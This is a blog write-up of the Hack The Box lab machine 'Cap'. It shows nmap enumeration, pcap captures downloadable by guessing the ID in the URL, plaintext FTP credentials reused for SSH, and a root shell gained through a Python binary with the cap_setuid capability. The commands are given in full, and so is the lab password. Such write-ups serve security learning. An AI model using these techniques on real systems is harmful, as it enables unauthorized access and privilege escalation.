<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Cap Write-up" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="https://g2jz.github.io/posts/cap/" /><meta property="og:url" content="https://g2jz.github.io/posts/cap/" /><meta property="og:site_name" content="root@g2jz:~#" /><meta property="og:image" content="https://g2jz.github.io/cover.png" /><meta property="og:image:height" content="300" /><meta property="og:image:width" content="700" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-03T09:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://g2jz.github.io/cover.png" /><meta property="twitter:title" content="Cap Write-up" /><meta name="twitter:site" content="@g2jzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-03T09:00:00+02:00","datePublished":"2022-10-03T09:00:00+02:00","description":"Enumeration","headline":"Cap Write-up","image":{"width":700,"height":300,"url":"https://g2jz.github.io/cover.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://g2jz.github.io/posts/cap/"},"url":"https://g2jz.github.io/posts/cap/"}</script><title>Cap Write-up | root@g2jz:~#</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="root@g2jz:~#"><meta name="application-name" content="root@g2jz:~#"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">root@g2jz:~#</a></div><div class="site-subtitle font-italic">g2jz's Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/g2jz" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/gaizka-martin/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/g2jzz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gmartinmendiola','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Cap Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Cap Write-up</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1664780400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 3, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 300'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/cover.png" class="preview-img bg" alt="Preview Image" width="700" height="300" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/g2jzz">Gaizka Martín Mendiola</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1347 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="os-detection"><span class="mr-2">OS Detection</span><a href="#os-detection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the <code class="language-plaintext highlighter-rouge">TTL (Time To Live)</code> of a <code class="language-plaintext highlighter-rouge">ping</code> response can give us clues. <code class="language-plaintext highlighter-rouge">TTL</code> will be close to 64 on Unix machines, close to 128 on Windows machines, and close to 255 on Solaris machines.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/ping.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Ping</em></p><p>We can see that the machine is a Linux machine.</p><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First, we will start enumerating the open ports on the victim machine. We will use <a href="https://github.com/nmap/nmap">nmap</a> for that. We will scan the full port range, we will filter for open ports, and we will use the TCP Syn Port Scan. To make the scan faster, we will disable DNS enumeration and host discovery. Lastly, we will export evidence to the <code class="language-plaintext highlighter-rouge">allPorts</code> file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allPorts 10.10.10.245
</pre></table></code></div></div><div file="enum/allPorts" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/allPorts"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Wed Jun 16 15:16:51 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.245
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.245 ()	Status: Up
Host: 10.10.10.245 ()	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Wed Jun 16 15:17:06 2021 -- 1 IP address (1 host up) scanned in 14.17 seconds
</pre></table></code></div></div><p>Once we know the open ports, we will scan them in a more exhaustive way to find the services and versions that are running. We will export evidence to the <code class="language-plaintext highlighter-rouge">targeted</code> file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,22,80 <span class="nt">-oN</span> targeted 10.10.10.245
</pre></table></code></div></div><div file="enum/targeted" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/targeted"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
</pre><td class="rouge-code"><pre># Nmap 7.91 scan initiated Wed Jun 16 15:17:36 2021 as: nmap -sC -sV -p21,22,80 -oN targeted 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.15s latency).


PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Wed, 16 Jun 2021 13:29:57 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 16 Jun 2021 13:29:51 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     &lt;!DOCTYPE html&gt;
|     &lt;html class="no-js" lang="en"&gt;
|     &lt;head&gt;
|     &lt;meta charset="utf-8"&gt;
|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
|     &lt;link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico"&gt;
|     &lt;link rel="stylesheet" href="/static/css/bootstrap.min.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/font-awesome.min.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/themify-icons.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/metisMenu.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/owl.carousel.min.css"&gt;
|     &lt;link rel="stylesheet" href="/static/css/slicknav.min.css"&gt;
|     &lt;!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Wed, 16 Jun 2021 13:29:52 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=6/16%Time=60C9F9F7%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Wed,\x2016\x20Jun\x202021\x2013:29:51\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\"no-js\"\x20lang=\"en\"&gt;\
SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"&gt;\n\x20\x20\x20\x2
SF:0&lt;meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\"&gt;\n\x20\
SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\
SF:x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=
SF:1\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"shortcut\x20icon\"\x20type=\"image
SF:/png\"\x20href=\"/static/images/icon/favicon\.ico\"&gt;\n\x20\x20\x20\x20&lt;
SF:link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\"&gt;
SF:\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/css/fon
SF:t-awesome\.min\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20
SF:href=\"/static/css/themify-icons\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=
SF:\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\"&gt;\n\x20\x20\x20\x2
SF:0&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\.
SF:css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/c
SF:ss/slicknav\.min\.css\"&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar")%r(HTTPOption
SF:s,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2
SF:016\x20Jun\x202021\x2013:29:52\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OP
SF:TIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20
SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\
SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP
SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n")%r(FourOhFourRequest,189
SF:,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20W
SF:ed,\x2016\x20Jun\x202021\x2013:29:57\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\"&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;
SF:\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 16 15:19:47 2021 -- 1 IP address (1 host up) scanned in 131.37 seconds
</pre></table></code></div></div><p>We can see that we have got the 21 (FTP), 22 (SSH) and 80 (HTTP) ports open.</p><h3 id="web-server"><span class="mr-2">Web Server</span><a href="#web-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will start by enumerating the web server.</p><p>This web server will have various sections, but one of them will attract our attention. This section will allow us to download network captures from the target machine:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 700'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/enum1.png" alt="Desktop View" width="1000" height="700" data-proofer-ignore> <em>Web Server Dashboard</em></p><p>We can see how this section seems to be empty. If we observe the URL of this section:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 200'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/enum2.png" alt="Desktop View" width="300" height="200" data-proofer-ignore> <em>Dashboard URL</em></p><p>This network captures are in the <code class="language-plaintext filepath highlighter-rouge">/data/{ID}</code> directory, where <code class="language-plaintext highlighter-rouge">{ID}</code> represents the number of the capture. We can see that in this case we are dealing with the 23rd capture.</p><p>At this point, we will try to enumerate further this network captures. Assuming that the network captures are ordered consecutively and in an ascending way, we will start with the number 0 capture:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 700'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/enum3.png" alt="Desktop View" width="1000" height="700" data-proofer-ignore> <em>Dashboard First Object</em></p><p>We can see how the number 0 capture does contain data, so we will try to download it.</p><h3 id="pcap"><span class="mr-2">PCAP</span><a href="#pcap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Once we download the file, we will see that it is named <code class="language-plaintext highlighter-rouge">0.pcap</code>, so we will inspect it with <a href="https://www.wireshark.org/download.html">Wireshark</a>:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/enum4.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Wireshark</em></p><p>There are many protocols in this network capture, but one of them is going to attract our attention. This protocol is <code class="language-plaintext highlighter-rouge">FTP</code>. As we know, <code class="language-plaintext highlighter-rouge">FTP</code> is an unsecure protocol and some of its critical transactions are made in plain text, for example, the authentication process. We will filter by <code class="language-plaintext highlighter-rouge">FTP</code> protocol and examine the capture further.</p><h3 id="ftp"><span class="mr-2">FTP</span><a href="#ftp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can see the authentication process in plain text, including the user and password that are used to login:</p><div file="credentials/ftp_ssh_Creds" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/ftp_ssh_Creds"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nathan:Buck3tH4TF0RM3!
</pre></table></code></div></div><p>We will try to connect with them to the FTP service:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/enum5.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>FTP</em></p><p>The directory that is hosted on the <code class="language-plaintext highlighter-rouge">FTP</code> server corresponds to the home directory of the <code class="language-plaintext highlighter-rouge">nathan</code> user, so we can retrieve the <code class="language-plaintext highlighter-rouge">user.txt</code> flag.</p><h2 id="user-shell"><span class="mr-2">User Shell</span><a href="#user-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>At this point, we have read permissions in the <code class="language-plaintext filepath highlighter-rouge">/home/nathan</code> directory of the target machine, but we don’t have a shell.</p><p>If we remember the enumeration phase, we had the 22 (SSH) port open. Sometimes the <code class="language-plaintext highlighter-rouge">FTP</code> and <code class="language-plaintext highlighter-rouge">SSH</code> services have the same credentials as the user on the target machine, so we will try to connect to the <code class="language-plaintext highlighter-rouge">SSH</code> service with the credentials that we have just found:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/user1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>SSH</em></p><p>We can see how we have a shell as the <code class="language-plaintext highlighter-rouge">nathan</code> user using the <code class="language-plaintext highlighter-rouge">SSH</code> service.</p><h2 id="root-shell"><span class="mr-2">Root Shell</span><a href="#root-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="enumeration-1"><span class="mr-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will start to enumerate the target machine in order to elevate our privileges to the <code class="language-plaintext highlighter-rouge">root</code> user.</p><h3 id="capabilities"><span class="mr-2">Capabilities</span><a href="#capabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can check for capabilities in binaries of the system. Capabilities allow programs to perform certain actions that are only meant for privileged users, even if they are executed by a non-privileged user.</p><p>In order to list the capabilities of the binaries on the system, we can use the <code class="language-plaintext highlighter-rouge">getcap</code> tool:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>getcap <span class="nt">-r</span> / 2&gt;/dev/null
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/root1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Get Capabilities</em></p><p>We can see that the <code class="language-plaintext highlighter-rouge">Python3.8</code> binary has some interesting capabilities. We have the <code class="language-plaintext highlighter-rouge">cap_setuid</code> and the <code class="language-plaintext highlighter-rouge">cap_net_bind_service</code> capabilities. The first one allows you to change the <code class="language-plaintext highlighter-rouge">uid</code> under which the binary runs. The second one lets us bind privileged ports (under 1024).</p><h3 id="shell-spawning"><span class="mr-2">Shell Spawning</span><a href="#shell-spawning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To obtain a shell as the <code class="language-plaintext highlighter-rouge">root</code> user, we will abuse the <code class="language-plaintext highlighter-rouge">cap_setuid</code> capability. This capability will allow us to run <code class="language-plaintext highlighter-rouge">Python</code> commands as the <code class="language-plaintext highlighter-rouge">root</code> user.</p><p>We will execute the following command to obtain a shell as the <code class="language-plaintext highlighter-rouge">root</code> user:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3.8 <span class="nt">-c</span> <span class="s2">"import os; os.setuid(0); os.system('/bin/bash')"</span>
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/cap/root2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Abuse Python Capability</em></p><p>Once we have a shell as the <code class="language-plaintext highlighter-rouge">root</code> user, we will proceed to visualize the <code class="language-plaintext highlighter-rouge">root.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">/root</code> directory.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/pcap/" class="post-tag no-text-decoration" >pcap</a> <a href="/tags/capabilities/" class="post-tag no-text-decoration" >capabilities</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 